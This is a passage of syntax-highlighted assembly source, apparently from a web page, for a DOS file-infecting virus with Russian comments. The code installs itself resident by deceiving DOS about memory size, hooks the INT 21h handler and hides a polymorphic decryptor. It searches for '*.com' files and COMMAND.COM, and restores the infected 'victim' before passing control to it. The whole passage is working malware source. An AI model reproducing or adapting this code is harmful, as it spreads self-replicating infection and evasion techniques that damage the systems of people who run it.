        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found</span><span class="sc0">

</span><span class="sc1">;--------------- выход из главной процедуры ----------------</span><span class="sc0">
</span><span class="sc5">exitINT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int24se</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int24of</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">92h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">90h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; восстановим int24</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetPoly</span><span class="sc0">         </span><span class="sc1">; Сокрытие попыток построения полиморфа</span><span class="sc0">
                                </span><span class="sc1">; ( Уничтожение построенного расшифровщика )</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; =============== Сюда попадаем после расшифровки ===================</span><span class="sc0">
</span><span class="sc5">virstart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">virln</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">             </span><span class="sc1">; Здесь будет хранится длина жертвы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Нашли сегмент с переменными среды</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">envseg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;       mov     [bp+v643h],cs</span><span class="sc0">
</span><span class="sc1">;       mov     [bp+v647h],cs</span><span class="sc0">
</span><span class="sc1">;       mov     [bp+v63Fh],cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; Проверяем, есть ли резидент в памяти:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0"> </span><span class="sc1">; Если "своя" функция возвращает 0FBh - выход</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NOQUIT</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DOS</span><span class="sc0">
</span><span class="sc5">NOQUIT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;        --------------- УСТАНОВКА РЕЗИДЕНТА ---------------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Проверяем MCB программы</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">5Ah</span><span class="sc0">     </span><span class="sc1">; Если блок не последний, то верхняя</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0">       </span><span class="sc1">; часть памяти скорее всего занята - ОБЛОМ :(</span><span class="sc0">
                                </span><span class="sc1">; (при попытке занять память она станет сегментированной)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Обманываем DOS - уменьшаем размер программы,</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">virlen</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; после завершения не вся память</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; освободится, образуется потерянный блок,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; куда мы и сунем резидент</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; es=сегмент, куда будет установлен резидент</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2A4h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">      </span><span class="sc1">; копируем вирус в верхнюю часть памяти (в es:100)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">86h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; В ax:bx - адрес обработчика INT21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21se</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21of</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; Сохраняем старый адрес INT21</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">86h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Resident</span><span class="sc0">      </span><span class="sc1">; Устанавливаем новый обработчик,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; более продвинутый ;)</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">DOS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">First</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Если это первый запуск из инсталлятора,</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RUN</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">                  </span><span class="sc1">; то жертвы нет</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">RUN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Oldshit</span><span class="sc0">       </span><span class="sc1">; Восстановим начало жертвы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; Дадим жертве порулить...</span><span class="sc0">

</span><span class="sc5">Oldshit</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; место для хранения начала жертвы</span><span class="sc0">



</span><span class="sc5">command</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'COMMAND.COM'</span><span class="sc0">
</span><span class="sc5">RGINC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">SILOD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">
</span><span class="sc5">CXLOD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">
</span><span class="sc5">RGLOD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4a2h</span><span class="sc0">
</span><span class="sc5">RGPUSH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">incSI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">xorSI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">1234H</span><span class="sc0">

</span><span class="sc5">ComMask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">First</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">envseg</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">int24of</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">int24se</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTAseg</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTAofs</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AddSize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">RandSeed</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5310h</span><span class="sc0">
</span><span class="sc5">RndSeed2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">2bh</span><span class="sc0">
</span><span class="sc5">RndSeed3</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">RndSeed4</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">RndSeed5</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">cMask</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                            </span><span class="sc1">; Здесь прячем адрес маски .com-файла</span><span class="sc0">

</span><span class="sc5">DTA</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FName</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc0">                     </span><span class="sc1">; Найденное имя .com-файла</span><span class="sc0">

</span><span class="sc5">virlen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">virend</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
